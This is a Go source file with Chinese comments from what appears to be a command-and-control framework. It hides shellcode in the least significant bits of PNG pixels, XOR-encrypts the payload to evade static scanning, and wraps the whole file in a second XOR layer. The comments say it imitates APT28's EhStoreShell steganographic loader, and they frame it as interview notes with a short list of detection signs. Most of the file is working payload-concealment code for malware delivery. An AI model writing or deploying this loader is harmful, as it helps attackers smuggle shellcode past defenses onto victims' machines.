// Package stego 提供 PNG 隐写功能，将 shellcode 嵌入 PNG 图像的 LSB。
// 借鉴 APT28 EhStoreShell 的 PNG 隐写加载器技术。
//
// 面试要点：
// 1. PNG LSB 隐写原理：
//    - PNG 使用 zlib 压缩像素数据，解压后每个像素有 filter byte + RGBA
//    - LSB（最低有效位）修改不会影响图片外观（128 vs 129 肉眼不可见）
//    - shellcode 转为比特流，逐像素嵌入最低有效位
// 2. 加密层：
//    - shellcode 先加 4 字节长度头（大端序）
//    - 整体 XOR 加密（防止静态扫描）
//    - PNG 文件整体再 XOR 一层（EhStoreShell 的双层加密）
// 3. 防御检测：
//    - 图片熵值异常（隐写 PNG 的熵高于正常图片）
//    - LSB 分布不均匀（正常图片 LSB 接近 50/50，隐写图片有偏差）
//    - 文件大小与图片尺寸不匹配
package weaponize

import (
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"hash/crc32"
	"io"
	"math"

	"github.com/aegis-c2/aegis/shared"
)

// Config 是隐写配置。
type Config struct {
	Width     int    // PNG 宽度（像素）
	Height    int    // PNG 高度（像素）
	BaseColor int    // 基础灰度值（0-255），默认 128
	XORKey    []byte // XOR 加密密钥
}

// DefaultConfig 返回默认配置。
func DefaultConfig() *Config {
	return &Config{
		Width:     800,
		Height:    600,
		BaseColor: 128,
		XORKey:    []byte{0x3A, 0xF1, 0x8C, 0x22, 0x77, 0xE4},
	}
}

// Embed 将 shellcode 嵌入 PNG 图像。
// 返回 PNG 文件的完整二进制数据。
func Embed(shellcode []byte, cfg *Config) ([]byte, error) {
	if cfg == nil {
		cfg = DefaultConfig()
	}

	// 1. 准备载荷：4 字节长度头 + shellcode
	payload := make([]byte, 4+len(shellcode))
	binary.BigEndian.PutUint32(payload[:4], uint32(len(shellcode)))
	copy(payload[4:], shellcode)

	// 2. XOR 加密 payload
	encrypted := shared.XORBytes(payload, cfg.XORKey)

	// 3. 转为 LSB 比特流
	bits := shared.BytesToBits(encrypted)

	// 4. 检查容量
	capacity := cfg.Width * cfg.Height * 3 // 每像素 3 通道 (RGB)，每通道 1 bit
	if len(bits) > capacity {
		return nil, fmt.Errorf("shellcode too large: need %d bits, have %d capacity", len(bits), capacity)
	}

	// 5. 生成像素数据
	pixels := generatePixels(bits, cfg)

	// 6. zlib 压缩
	var compressed bytes.Buffer
	w := zlib.NewWriter(&compressed)
	w.Write(pixels)
	w.Close()

	// 7. 构造 PNG 文件
	png := buildPNG(cfg, compressed.Bytes())

	// 8. PNG 文件整体 XOR 加密（外层加密）
	outerKey := make([]byte, 8)
	rand.Read(outerKey)
	png = shared.XORBytes(png, outerKey)

	// 外层密钥放在文件开头（8 字节），EhStoreShell 读取时先解密
	final := append(outerKey, png...)

	return final, nil
}

// Extract 从隐写 PNG 中提取 shellcode。
func Extract(pngData []byte, xorKey []byte) ([]byte, error) {
	if len(pngData) < 8 {
		return nil, fmt.Errorf("png data too short")
	}

	// 1. 提取外层 XOR 密钥
	outerKey := pngData[:8]
	pngData = pngData[8:]

	// 2. 解密外层 XOR
	pngData = shared.XORBytes(pngData, outerKey)

	// 3. 跳过 PNG 签名 (8 bytes) 和 IHDR chunk
	if len(pngData) < 8 || !bytes.Equal(pngData[:8], []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}) {
		return nil, fmt.Errorf("invalid PNG signature")
	}

	// 4. 找到 IDAT chunk 并解压
	idatData, err := shared.ExtractIDAT(pngData)
	if err != nil {
		return nil, err
	}

	// 5. zlib 解压
	reader, err := zlib.NewReader(bytes.NewReader(idatData))
	if err != nil {
		return nil, fmt.Errorf("zlib decompress: %w", err)
	}
	defer reader.Close()

	pixels, err := io.ReadAll(reader)
	if err != nil {
		return nil, fmt.Errorf("read pixels: %w", err)
	}

	// 6. 提取 LSB 比特流
	bits := shared.ExtractLSB(pixels, shared.ReadPNGWidth(pngData))

	// 7. 重组字节
	encrypted := shared.BitsToBytes(bits)

	// 8. 先 XOR 解密整体（长度头 + shellcode），再读长度
	decrypted := shared.XORBytes(encrypted, xorKey)
	if len(decrypted) < 4 {
		return nil, fmt.Errorf("decrypted payload too short")
	}

	scLen := binary.BigEndian.Uint32(decrypted[:4])
	if int(scLen) > len(decrypted)-4 {
		return nil, fmt.Errorf("shellcode length mismatch: header says %d, have %d bytes", scLen, len(decrypted)-4)
	}

	return decrypted[4 : 4+scLen], nil
}

// generatePixels 生成像素数据（RGB，每像素 3 字节）。
func generatePixels(bits []byte, cfg *Config) []byte {
	totalPixels := cfg.Width * cfg.Height
	pixels := make([]byte, totalPixels*3) // RGB, no alpha

	bitIdx := 0
	for i := 0; i < totalPixels; i++ {
		for ch := 0; ch < 3; ch++ { // R, G, B
			base := byte(cfg.BaseColor)
			if bitIdx < len(bits) {
				// 修改最低有效位
				base = (base & 0xFE) | bits[bitIdx]
				bitIdx++
			}
			pixels[i*3+ch] = base
		}
	}

	// 添加 PNG filter byte（每行前面加 0 = None filter）
	// PNG 格式：每行开头有一个 filter byte
	output := make([]byte, 0, totalPixels*3+cfg.Height)
	for row := 0; row < cfg.Height; row++ {
		output = append(output, 0) // None filter
		start := row * cfg.Width * 3
		end := start + cfg.Width*3
		output = append(output, pixels[start:end]...)
	}

	return output
}

// buildPNG 构造完整的 PNG 文件。
func buildPNG(cfg *Config, compressedData []byte) []byte {
	var buf bytes.Buffer

	// PNG 签名
	buf.Write([]byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A})

	// IHDR chunk
	ihdrData := make([]byte, 13)
	binary.BigEndian.PutUint32(ihdrData[0:4], uint32(cfg.Width))
	binary.BigEndian.PutUint32(ihdrData[4:8], uint32(cfg.Height))
	ihdrData[8] = 8  // bit depth
	ihdrData[9] = 2  // color type: RGB
	ihdrData[10] = 0 // compression: deflate
	ihdrData[11] = 0 // filter: adaptive
	ihdrData[12] = 0 // interlace: none
	writeChunk(&buf, []byte("IHDR"), ihdrData)

	// IDAT chunk
	writeChunk(&buf, []byte("IDAT"), compressedData)

	// IEND chunk
	writeChunk(&buf, []byte("IEND"), nil)

	return buf.Bytes()
}

// writeChunk 写入一个 PNG chunk（length + type + data + CRC）。
func writeChunk(buf *bytes.Buffer, chunkType, data []byte) {
	// Length
	binary.Write(buf, binary.BigEndian, uint32(len(data)))
	// Type
	buf.Write(chunkType)
	// Data
	buf.Write(data)
	// CRC (type + data)
	crcBuf := make([]byte, len(chunkType)+len(data))
	copy(crcBuf, chunkType)
	copy(crcBuf[len(chunkType):], data)
	crc := crc32.ChecksumIEEE(crcBuf)
	binary.Write(buf, binary.BigEndian, crc)
}

// EstimateSize 估算容纳指定大小 shellcode 需要的图片尺寸。
func EstimateSize(shellcodeLen int) (width, height int) {
	bits := (shellcodeLen + 4) * 8 // +4 for length header
	pixels := int(math.Ceil(float64(bits) / 3.0))
	// 16:9 ratio
	width = int(math.Ceil(math.Sqrt(float64(pixels) * 16.0 / 9.0)))
	height = int(math.Ceil(float64(pixels) / float64(width)))
	return
}
